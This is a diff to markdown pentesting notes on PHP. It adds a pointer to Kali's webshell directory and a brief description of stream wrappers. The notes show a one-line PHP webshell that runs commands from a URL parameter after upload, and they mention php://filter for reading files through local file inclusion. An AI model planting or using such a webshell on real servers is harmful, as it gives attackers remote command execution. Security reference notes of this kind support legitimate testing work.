@@ -1,12 +1,15 @@
-**Tags:** #type/tech-specific
+**Tags:** #type/tech-specific #tactic/execution/server-side 
 
 ---
 # Fundamentals
 execute system command in php: `<?php echo system('uname -a'); ?>`
+
+# Pentesting
+Useful PHP webshells are located in kali at: `/usr/share/webshells/php`
 simple php webshell: `<?php echo system($_GET['cmd']); ?>`
 takes shell command in the URL: upload file and then use `[url to file]?cmd=<command>`
-# Pentesting
 ## Wrappers
+Provide a filestream-like interface for various resource types such as HTTP, text, ZIP,...
 There are a lots of [different wrappers](https://www.php.net/manual/en/wrappers.php). Most interesting are:
 #### php://filter
 When using LFI, display the (encoded) file content rather than to execute it.
